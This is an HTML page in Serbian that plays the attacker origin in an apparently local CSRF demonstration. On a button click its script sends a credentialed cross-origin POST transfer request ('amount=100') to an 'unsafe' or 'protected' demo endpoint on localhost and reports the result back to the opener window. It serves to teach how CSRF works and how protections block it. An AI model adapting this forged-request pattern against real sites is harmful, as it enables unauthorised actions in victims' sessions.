<!doctype html>
<html lang="sr">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Attacker origin</title>
<style>body{font-family:Arial;max-width:560px;margin:40px auto;padding:20px;background:#fff5f5}pre{white-space:pre-wrap;background:#222;color:#fff;padding:14px}button{padding:12px;background:#e63946;color:#fff;border:0}</style></head>
<body>
  <h1>Napadačka stranica — localhost:5174</h1>
  <p>Ova stranica ne čita cookie, JWT niti localStorage žrtve i ne postavlja Authorization ili CSRF zaglavlje.</p>
  <button id="attack">Pošalji zahtev bez znanja aplikacije</button>
  <pre id="result">Klikni dugme da eksplicitno pokreneš demonstraciju.</pre>
  <script>
    const target = new URLSearchParams(location.search).get('target') === 'protected' ? 'protected' : 'unsafe';
    document.getElementById('attack').onclick = async () => {
      let status = 0; let message = '';
      try {
        const response = await fetch(`http://localhost:8080/api/csrf-demo/${target}/transfer`, {
          method: 'POST', credentials: 'include',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'amount=100'
        });
        status = response.status;
        const data = await response.json(); message = data.message || JSON.stringify(data);
      } catch (error) { message = error.message; }
      document.getElementById('result').textContent = `HTTP ${status}\n${message}`;
      window.opener?.postMessage({ type: 'csrf-demo-result', target, status, message }, 'http://localhost:5173');
    };
  </script>
</body></html>
